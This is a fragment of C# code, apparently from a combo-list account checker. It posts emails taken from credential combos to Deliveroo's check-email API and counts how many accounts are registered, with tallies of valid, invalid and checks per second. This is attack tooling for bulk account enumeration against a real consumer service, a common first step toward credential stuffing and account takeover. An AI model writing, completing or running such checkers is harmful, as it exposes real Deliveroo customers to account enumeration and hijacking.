        ...
        static void Worker(string combo)
        {
            try
            {
                ...
                })
                {
                    ...
                    string pre = req.Get("https://deliveroo.com.au/login?redirect=%2F").ToString();

                    string check = req.Post("https://consumer-ow-api.deliveroo.com/orderapp/v1/check-email", "{\"email_address\":\"" + credentials[0] + "\"}", "application/json").ToString();
               
                    if (check.Contains("{\"registered\":true,\"identity_providers\":[\"email\"],\"identity_provider_hint\":\"You'll need to create a password to continue via email.\"}"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                    ...
                    else if (check.Contains("{\"registered\":false"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
